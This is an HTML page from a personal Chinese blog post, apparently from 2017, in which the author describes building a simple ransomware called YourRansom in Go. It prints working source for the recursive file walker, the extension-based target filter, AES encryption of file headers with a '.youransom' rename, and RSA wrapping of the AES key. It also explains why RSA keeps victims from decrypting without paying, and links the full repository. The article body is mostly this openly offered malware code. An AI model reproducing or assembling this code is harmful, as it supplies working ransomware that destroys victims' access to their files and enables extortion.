@@ -1,0 +1,464 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <meta charset="utf-8">
+    
+    <title>自制勒索有感 &amp; 技术简析 | Note of bobo</title>
+    
+    
+        <meta name="keywords" content="自制勒索有感 &amp; 技术简析" />
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="嘛自从去年 10 月更过博客之后就啥都没写过了。。。这次正好趁着卫队搞新年活动写点什么。 前段时间在卡饭，勒索病毒是很火的一个讨论话题，而我也跟着一位大神的风写了一个简单的勒索病毒，这里写一点东西，作为纪念。 说起勒索病毒，其实它的行为和技术都很简单（除了某些硬肛硬盘的品种之外，当然我们今天讨论的只有普通的文件加密病毒，像 cerber 那样的）其主要行为由遍历和加密两部分组成，下面在下使用自己的">
+<meta property="og:type" content="article">
+<meta property="og:title" content="自制勒索有感 &amp; 技术简析">
+<meta property="og:url" content="https://bobo.moe/post/ransom/index.html">
+<meta property="og:site_name" content="Note of bobo">
+<meta property="og:description" content="嘛自从去年 10 月更过博客之后就啥都没写过了。。。这次正好趁着卫队搞新年活动写点什么。 前段时间在卡饭，勒索病毒是很火的一个讨论话题，而我也跟着一位大神的风写了一个简单的勒索病毒，这里写一点东西，作为纪念。 说起勒索病毒，其实它的行为和技术都很简单（除了某些硬肛硬盘的品种之外，当然我们今天讨论的只有普通的文件加密病毒，像 cerber 那样的）其主要行为由遍历和加密两部分组成，下面在下使用自己的">
+<meta property="og:locale" content="en">
+<meta property="og:updated_time" content="2018-02-09T16:18:57.830Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="自制勒索有感 &amp; 技术简析">
+<meta name="twitter:description" content="嘛自从去年 10 月更过博客之后就啥都没写过了。。。这次正好趁着卫队搞新年活动写点什么。 前段时间在卡饭，勒索病毒是很火的一个讨论话题，而我也跟着一位大神的风写了一个简单的勒索病毒，这里写一点东西，作为纪念。 说起勒索病毒，其实它的行为和技术都很简单（除了某些硬肛硬盘的品种之外，当然我们今天讨论的只有普通的文件加密病毒，像 cerber 那样的）其主要行为由遍历和加密两部分组成，下面在下使用自己的">
+    
+
+    
+        <link rel="alternate" href="/atom.xml" title="Note of bobo" type="application/atom+xml" />
+    
+
+    
+        <link rel="icon" href="/favicon.ico" />
+    
+
+    <link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">
+    <link rel="stylesheet" href="/libs/open-sans/styles.css">
+    <link rel="stylesheet" href="/libs/source-code-pro/styles.css">
+
+    <link rel="stylesheet" href="/css/style.css">
+    <script src="/libs/jquery/2.1.3/jquery.min.js"></script>
+    <script src="/libs/jquery/plugins/cookie/1.4.1/jquery.cookie.js"></script>
+    
+    
+        <link rel="stylesheet" href="/libs/lightgallery/css/lightgallery.min.css">
+    
+    
+        <link rel="stylesheet" href="/libs/justified-gallery/justifiedGallery.min.css">
+    
+    
+    
+    
+        <script>
+var _hmt = _hmt || [];
+(function() {
+    var hm = document.createElement("script");
+    hm.src = "//hm.baidu.com/hm.js?1817e24cd627962885057360855fa395";
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+    
+
+
+</head>
+
+<body>
+    <div id="container">
+        <header id="header">
+    <div id="header-main" class="header-inner">
+        <div class="outer">
+            <a href="/" id="logo">
+                <i class="logo"></i>
+                <span class="site-title">Note of bobo</span>
+            </a>
+            <nav id="main-nav">
+                
+                    <a class="main-nav-link" href="/">首页</a>
+                
+                    <a class="main-nav-link" href="/about">关于</a>
+                
+            </nav>
+            
+            <div id="search-form-wrap">
+
+    <form class="search-form">
+        <input type="text" class="ins-search-input search-form-input" placeholder="Search" />
+        <button type="submit" class="search-form-submit"></button>
+    </form>
+    <div class="ins-search">
+    <div class="ins-search-mask"></div>
+    <div class="ins-search-container">
+        <div class="ins-input-wrapper">
+            <input type="text" class="ins-search-input" placeholder="Type something..." />
+            <span class="ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
+        </div>
+        <div class="ins-section-wrapper">
+            <div class="ins-section-container"></div>
+        </div>
+    </div>
+</div>
+<script>
+(function (window) {
+    var INSIGHT_CONFIG = {
+        TRANSLATION: {
+            POSTS: 'Posts',
+            PAGES: 'Pages',
+            CATEGORIES: 'Categories',
+            TAGS: 'Tags',
+            UNTITLED: '(Untitled)',
+        },
+        ROOT_URL: '/',
+        CONTENT_URL: '/content.json',
+    };
+    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+})(window);
+</script>
+<script src="/js/insight.js"></script>
+
+</div>
+        </div>
+    </div>
+    <div id="main-nav-mobile" class="header-sub header-inner">
+        <table class="menu outer">
+            <tr>
+                
+                    <td><a class="main-nav-link" href="/">首页</a></td>
+                
+                    <td><a class="main-nav-link" href="/about">关于</a></td>
+                
+                <td>
+                    
+    <div class="search-form">
+        <input type="text" class="ins-search-input search-form-input" placeholder="Search" />
+    </div>
+
+                </td>
+            </tr>
+        </table>
+    </div>
+</header>
+
+        <div class="outer">
+            
+            
+                <aside id="sidebar">
+   
+        
+    <div class="widget-wrap" id='categories'>
+        <h3 class="widget-title">
+            <span>categories</span>
+            &nbsp;
+            <a id='allExpand' href="#">
+                <i class="fa fa-angle-double-down fa-2x"></i>
+            </a>
+        </h3>
+        
+        
+        
+         <ul class="unstyled" id="tree" > 
+                    <li class="directory open">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder-open"></i>
+                            &nbsp;
+                            手记
+                        </a>
+                         <ul class="unstyled" id="tree" > 
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            随想
+                        </a>
+                         <ul class="unstyled" id="tree" >  <li class="file"><a href="/post/vt-privacy/">关于 VirusTotal 隐私的几点讨论</a></li>  </ul> 
+                    </li> 
+                     <li class="file"><a href="/post/zes-test/">Zemana Endpoint Security (ZES) 简单测评</a></li>  <li class="file"><a href="/post/zemana-white-book/">Zemana 非官方技术白皮书</a></li>  <li class="file"><a href="/post/move-to-hugo/">博客折腾记 (迁移到 Hugo 和 Gitment)</a></li>  <li class="file"><a href="/post/py-pic/">记一次对于 Py 图像库的蛋疼应用</a></li>  <li class="file active"><a href="/post/ransom/">自制勒索有感 & 技术简析</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            经验
+                        </a>
+                         <ul class="unstyled" id="tree" >  <li class="file"><a href="/post/cf-true/">正确地使用 Cloudflare 保护你的网站</a></li>  </ul> 
+                    </li> 
+                     <li class="file"><a href="/post/index/">Welcome to Note of bobo</a></li>  </ul> 
+    </div>
+    <script>
+        $(document).ready(function() {
+            var iconFolderOpenClass  = 'fa-folder-open';
+            var iconFolderCloseClass = 'fa-folder';
+            var iconAllExpandClass = 'fa-angle-double-down';
+            var iconAllPackClass = 'fa-angle-double-up';
+            // Handle directory-tree expansion:
+            // 左键单独展开目录
+            $(document).on('click', '#categories a[data-role="directory"]', function (event) {
+                event.preventDefault();
+
+                var icon = $(this).children('.fa');
+                var expanded = icon.hasClass(iconFolderOpenClass);
+                var subtree = $(this).siblings('ul');
+                icon.removeClass(iconFolderOpenClass).removeClass(iconFolderCloseClass);
+                if (expanded) {
+                    if (typeof subtree != 'undefined') {
+                        subtree.slideUp({ duration: 100 });
+                    }
+                    icon.addClass(iconFolderCloseClass);
+                } else {
+                    if (typeof subtree != 'undefined') {
+                        subtree.slideDown({ duration: 100 });
+                    }
+                    icon.addClass(iconFolderOpenClass);
+                }
+            });
+            // 右键展开下属所有目录
+            $('#categories a[data-role="directory"]').bind("contextmenu", function(event){
+                event.preventDefault();
+                
+                var icon = $(this).children('.fa');
+                var expanded = icon.hasClass(iconFolderOpenClass);
+                var listNode = $(this).siblings('ul');
+                var subtrees = $.merge(listNode.find('li ul'), listNode);
+                var icons = $.merge(listNode.find('.fa'), icon);
+                icons.removeClass(iconFolderOpenClass).removeClass(iconFolderCloseClass);
+                if(expanded) {
+                    subtrees.slideUp({ duration: 100 });
+                    icons.addClass(iconFolderCloseClass);
+                } else {
+                    subtrees.slideDown({ duration: 100 });
+                    icons.addClass(iconFolderOpenClass);
+                }
+            })
+            // 展开关闭所有目录按钮
+            $(document).on('click', '#allExpand', function (event) {
+                event.preventDefault();
+                
+                var icon = $(this).children('.fa');
+                var expanded = icon.hasClass(iconAllExpandClass);
+                icon.removeClass(iconAllExpandClass).removeClass(iconAllPackClass);
+                if(expanded) {
+                    $('#sidebar .fa.fa-folder').removeClass('fa-folder').addClass('fa-folder-open')
+                    $('#categories li ul').slideDown({ duration: 100 });
+                    icon.addClass(iconAllPackClass);
+                } else {
+                    $('#sidebar .fa.fa-folder-open').removeClass('fa-folder-open').addClass('fa-folder')
+                    $('#categories li ul').slideUp({ duration: 100 });
+                    icon.addClass(iconAllExpandClass);
+                }
+            });  
+        });
+    </script>
+
+    
+        
+    <div class="widget-wrap widget-list">
+        <h3 class="widget-title"><span>links</span></h3>
+        <div class="widget">
+            <ul>
+                
+                    <li>
+                        <a href="https://qwq.moe/">蚊子酱</a>
+                    </li>
+                
+                    <li>
+                        <a href="https://ylws.me/">雨落无声</a>
+                    </li>
+                
+            </ul>
+        </div>
+    </div>
+
+
+    
+    <div id="toTop" class="fa fa-angle-up"></div>
+</aside>
+            
+            <section id="main"><article id="post-ransom" class="article article-type-post" itemscope itemprop="blogPost">
+    <div class="article-inner">
+        
+        
+            <header class="article-header">
+                
+                    <div class="article-meta">
+                        
+    <div class="article-category">
+    	<i class="fa fa-folder"></i>
+        <a class="article-category-link" href="/categories/手记/">手记</a>
+    </div>
+
+                        
+                        
+    <div class="article-date">
+        <i class="fa fa-calendar"></i>
+        <a href="/post/ransom/">
+            <time datetime="2017-01-09T16:00:00.000Z" itemprop="datePublished">2017-01-10</time>
+        </a>
+    </div>
+
+
+                        
+                            <div class="article-meta-button">
+                                <a href='https://github.com/popu125/blog/raw/master/source/_posts/ransom.md'> Source </a>
+                            </div>
+                            <div class="article-meta-button">
+                                <a href='https://github.com/popu125/blog/edit/master/source/_posts/ransom.md'> Edit </a>
+                            </div>
+                            <div class="article-meta-button">
+                                <a href='https://github.com/popu125/blog/commits/master/source/_posts/ransom.md'> History </a>
+                            </div>
+                        
+                    </div>
+                
+                
+    
+        <h1 class="article-title" itemprop="name">
+            自制勒索有感 &amp; 技术简析
+        </h1>
+    
+
+            </header>
+        
+        
+        <div class="article-entry" itemprop="articleBody">
+        
+        
+            
+        
+        
+            <p>嘛自从去年 10 月更过博客之后就啥都没写过了。。。这次正好趁着卫队搞新年活动写点什么。</p>
+<p>前段时间在卡饭，勒索病毒是很火的一个讨论话题，而我也跟着一位大神的风写了一个简单的勒索病毒，这里写一点东西，作为纪念。</p>
+<p>说起勒索病毒，其实它的行为和技术都很简单（除了某些硬肛硬盘的品种之外，当然我们今天讨论的只有普通的文件加密病毒，像 cerber 那样的）<br>其主要行为由遍历和加密两部分组成，下面在下使用自己的代码分析一下这两部分的实现（代码较渣还请原谅</p>
+<p>首先是遍历，这一部分十分简单，不过还有一个很重要的问题需要注意：不要无脑。先前在下的第一版 YourRansom 就是因为无脑遍历进了系统文件夹还试图加密才被。。。<br>闲话不多说，先上代码：</p>
+<figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">do_cAll</span><span class="params">(path <span class="keyword">string</span>, cip cipher.Block, action <span class="keyword">byte</span>)</span> <span class="title">error</span></span> &#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//	获取一下路径的信息 </span></span><br><span class="line">	dir, serr := os.Stat(path)</span><br><span class="line">	<span class="keyword">if</span> serr != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> serr</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//	判断是否是个目录，如果不是就交给加(解) 密处理</span></span><br><span class="line">	<span class="keyword">if</span> !dir.IsDir() &#123;</span><br><span class="line">		<span class="keyword">if</span> action == <span class="string">'e'</span> &amp;&amp; !filter(path, action) &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">		&#125;</span><br><span class="line">		fmt.Println(<span class="string">"File:"</span>, path)</span><br><span class="line">		<span class="keyword">switch</span> action &#123;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">'e'</span>:</span><br><span class="line">			encrypt(path, cip)</span><br><span class="line">		<span class="keyword">case</span> <span class="string">'d'</span>:</span><br><span class="line">			decrypt(path, cip)</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//	既然到这里了那就是个目录了，让我们继续遍历</span></span><br><span class="line">	fmt.Println(<span class="string">"Path:"</span>, path)</span><br><span class="line">	<span class="comment">//	先打开这个目录</span></span><br><span class="line">	fd, err := os.Open(path)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> err</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//	获取到目录下前 100 个文件名</span></span><br><span class="line">	names, err1 := fd.Readdirnames(<span class="number">100</span>)</span><br><span class="line">	<span class="keyword">if</span> <span class="built_in">len</span>(names) == <span class="number">0</span> || err1 != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//	为每一个文件名迭代一遍自身</span></span><br><span class="line">	<span class="keyword">for</span> _, name := <span class="keyword">range</span> names &#123;</span><br><span class="line">		do_cAll(path+<span class="keyword">string</span>(os.PathSeparator)+name, cip, action)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>其中为了防止无脑遍历我上了一个 filter 函数，用于判断传入的目录或文件名是否有关键词，以确认是否可以肛(虽然实现还是很无脑)：<br><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">filter</span><span class="params">(path <span class="keyword">string</span>, action <span class="keyword">byte</span>)</span> <span class="title">bool</span></span> &#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//	将传入的路径转为全小写，便于判断</span></span><br><span class="line">	lowPath := strings.ToLower(path)</span><br><span class="line"></span><br><span class="line">	<span class="comment">//	屏蔽和加密后缀列表</span></span><br><span class="line">	innerList := []<span class="keyword">string</span>&#123;<span class="string">"windows"</span>, <span class="string">"program"</span>, <span class="string">"appdata"</span>, <span class="string">"system"</span>&#125;</span><br><span class="line">	suffixList := []<span class="keyword">string</span>&#123;<span class="string">".txt"</span>, <span class="string">".zip"</span>, <span class="string">".rar"</span>, <span class="string">".7z"</span>, <span class="string">".doc"</span>, <span class="string">".docx"</span>, <span class="string">".ppt"</span>, <span class="string">".pptx"</span>, <span class="string">".xls"</span>, <span class="string">".xlsx"</span>, <span class="string">".jpg"</span>, <span class="string">".gif"</span>, <span class="string">".jpeg"</span>, <span class="string">".png"</span>, <span class="string">".mpg"</span>, <span class="string">".mov"</span>, <span class="string">".mp4"</span>, <span class="string">".avi"</span>, <span class="string">".mp3"</span>&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//	判断路径中是否包含敏感词(大雾)</span></span><br><span class="line">	<span class="keyword">for</span> _, inner := <span class="keyword">range</span> innerList &#123;</span><br><span class="line">		<span class="keyword">if</span> strings.Contains(lowPath, inner) &#123;</span><br><span class="line">			<span class="comment">//		如果存在就返回 false</span></span><br><span class="line">			<span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//	判断路径是否以加密后缀结尾</span></span><br><span class="line">	<span class="keyword">for</span> _, suffix := <span class="keyword">range</span> suffixList &#123;</span><br><span class="line">		<span class="keyword">if</span> strings.HasSuffix(lowPath, suffix) &#123;</span><br><span class="line">			<span class="comment">//			如果是就返回 true</span></span><br><span class="line">			<span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//	既然到这里了那肯定就是既不包含敏感词，也没有加密后缀名的，还是 false</span></span><br><span class="line">	<span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>嗯，这样遍历就实现完成了，接下来是加密这个重头戏。得益于 Golang 内置库的完备，我们可以直接 import 一个 <code>crypto/aes</code> 包来实现 aes 的加解密。<br>下面是 aes 加密的实现：</p>
+<figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">encrypt</span><span class="params">(filename <span class="keyword">string</span>, cip cipher.Block)</span> <span class="title">error</span></span> &#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//	判断该文件是否已加密了</span></span><br><span class="line">	<span class="keyword">if</span> <span class="built_in">len</span>(filename) &gt;= <span class="number">11</span> &amp;&amp; filename[<span class="built_in">len</span>(filename)<span class="number">-10</span>:] == <span class="string">".youransom"</span> &#123;</span><br><span class="line">		fmt.Println(<span class="string">"Warning: A encrypted file found."</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//	试图打开文件用于写入</span></span><br><span class="line">	f, err := os.OpenFile(filename, os.O_RDWR, <span class="number">0</span>)</span><br><span class="line">	fmt.Println(<span class="string">"Encrypt:"</span>, filename)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> err</span><br><span class="line">	&#125;</span><br><span class="line">	fstat, _ := f.Stat()</span><br><span class="line">	size := fstat.Size()</span><br><span class="line"></span><br><span class="line">	<span class="comment">//	开始循环加密</span></span><br><span class="line">	buf, out := <span class="built_in">make</span>([]<span class="keyword">byte</span>, <span class="number">16</span>), <span class="built_in">make</span>([]<span class="keyword">byte</span>, <span class="number">16</span>)</span><br><span class="line">	<span class="keyword">for</span> offset := <span class="keyword">int64</span>(<span class="number">0</span>); size-offset &gt; <span class="number">16</span> &amp;&amp; offset &lt; <span class="number">512</span>; offset += <span class="number">16</span> &#123;</span><br><span class="line">		f.ReadAt(buf, offset)</span><br><span class="line">		cip.Encrypt(out, buf)</span><br><span class="line">		f.WriteAt(out, offset)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//	关闭文件并添加后缀</span></span><br><span class="line">	f.Close()</span><br><span class="line">	os.Rename(filename, filename+<span class="string">".youransom"</span>)</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>嗯，在下很贴心地添加了防止二次加密的相关判断用于保护用户的数据安全，多么贴心啊(滑稽</p>
+<p>相信有不少兄弟在看到 aes 加密的时候都是一脸蒙蔽状态：这是啥为啥我看不明白。其实不需要在意太多，因为是全黑盒的所以只要用就好了。<br>不过基础知识还是要知道的，这里在下简单地说一下：</p>
+<p>AES 是一种对称加密算法，通常我们可以认为在没有密钥的情况下是无法解密 AES 的。而所谓对称加密，可以理解为像通常我们理解的加解密那样，用同一个密钥既能加密，也能解密。<br>这背后是有比较复杂的数学原理的，喜欢探究而且高数成绩不错的同学可以试试去 wiki 的 aes 页面看一眼。</p>
+<p>毫无疑问 AES 的性能是很高的，而通常我们看到的勒索却大都写着使用 RSA 加密，这是一个显而易见的原因的，就是 AES 是对称加密。<br>我们很难去简单的使用对称加密实现一个 “用户被加密之后不管怎么搞都解不了密只能乖乖交钱” 的场景，无论是发送到服务器，还是保存到本地，都是很危险的。<br>还记得曾经有一个国产加密使用 AES 还直接把密钥存到本地最后没收到钱还被嘲讽了一番的悲伤故事么？</p>
+<p>而这种场景交由 rsa 实现简直不能再棒了：<br>RSA 是一种非对称加密，它有两个密钥：用其中一个密钥加密的数据只有用另一个密钥才能解密。这就完美地消除了将密钥存储在本地的危险。</p>
+<p>下面是在下使用 rsa 加密 aes 密钥的实现：</p>
+<figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">saveKey</span><span class="params">(cip []<span class="keyword">byte</span>)</span></span> &#123;</span><br><span class="line">	keyFile, _ := os.Create(<span class="string">"YourRansom.key"</span>)</span><br><span class="line">	block, _ := pem.Decode(pubKey)</span><br><span class="line">	pubI, _ := x509.ParsePKIXPublicKey(block.Bytes)</span><br><span class="line">	pub := pubI.(*rsa.PublicKey)</span><br><span class="line">	word, _ := rsa.EncryptPKCS1v15(rand.Reader, pub, cip)</span><br><span class="line">	keyFile.WriteAt(word, <span class="number">0</span>)</span><br><span class="line">	<span class="keyword">return</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>最后把它们拼在一起，就成为了 YourRansom，一个简单至极的自制勒索。</p>
+<p>Github：<a href="https://github.com/popu125/YourRansom" target="_blank" rel="noopener">https://github.com/popu125/YourRansom</a></p>
+<p>17/01/17</p>
+
+            </div>
+        
+        <footer class="article-footer">
+        </footer>
+    </div>
+</article>
+
+
+    
+<nav id="article-nav">
+    
+        <a href="/post/move-to-hugo/" id="article-nav-newer" class="article-nav-link-wrap">
+            <strong class="article-nav-caption">Newer</strong>
+            <div class="article-nav-title">
+                
+                    博客折腾记 (迁移到 Hugo 和 Gitment)
+                
+            </div>
+        </a>
+    
+    
+</nav>
+
+
+
+
+
+    
+    
+        <section id="comments"> 
+    <div id="disqus_thread">
+        <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    </div>
+ </section>
+    
+
+
+
+
+<!-- baidu url auto push script -->
+<script type="text/javascript">
+    !function(){var e=/([http|https]:\/\/[a-zA-Z0-9\_\.]+\.baidu\.com)/gi,r=window.location.href,o=document.referrer;if(!e.test(r)){var n="//api.share.baidu.com/s.gif";o?(n+="?r="+encodeURIComponent(document.referrer),r&&(n+="&l="+r)):r&&(n+="?l="+r);var t=new Image;t.src=n}}(window);
+</script>     
+</section>
+        </div>
+        <footer id="footer">
+    <div class="outer">
+        <div id="footer-info" class="inner">
+            bobo liu &copy; 2018 
+            <a rel="license" href="http://creativecommons.org/licenses/by-nc-nd/4.0/"><img alt="Creative Commons License" style="border-width:0" src="https://i.creativecommons.org/l/by-nc-nd/4.0/80x15.png" /></a>
+            <br> Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>. Theme - <a href="https://github.com/zthxxx/hexo-theme-Wikitten">wikitten</a>
+        </div>
+    </div>
+</footer>
+        
+    
+    <script>
+    var disqus_config = function () {
+        
+            this.page.url = 'https://bobo.moe/post/ransom/';
+        
+        this.page.identifier = 'ransom';
+    };
+    (function() { 
+        var d = document, s = d.createElement('script');  
+        s.src = '//' + 'bonote' + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+
+
+
+    
+        <script src="/libs/lightgallery/js/lightgallery.min.js"></script>
+        <script src="/libs/lightgallery/js/lg-thumbnail.min.js"></script>
+        <script src="/libs/lightgallery/js/lg-pager.min.js"></script>
+        <script src="/libs/lightgallery/js/lg-autoplay.min.js"></script>
+        <script src="/libs/lightgallery/js/lg-fullscreen.min.js"></script>
+        <script src="/libs/lightgallery/js/lg-zoom.min.js"></script>
+        <script src="/libs/lightgallery/js/lg-hash.min.js"></script>
+        <script src="/libs/lightgallery/js/lg-share.min.js"></script>
+        <script src="/libs/lightgallery/js/lg-video.min.js"></script>
+    
+    
+        <script src="/libs/justified-gallery/jquery.justifiedGallery.min.js"></script>
+    
+    
+        <script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
+            processEscapes: true,
+            TeX: {
+                equationNumbers: {
+                  autoNumber: 'AMS'
+                }
+            }
+        }
+    });
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax();
+        for (var i = 0; i < all.length; ++i)
+            all[i].SourceElement().parentNode.className += ' has-jax';
+    });
+</script>
+<script async src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+    
+
+
+
+<!-- Custom Scripts -->
+<script src="/js/main.js"></script>
+
+    </div>
+</body>
+</html>
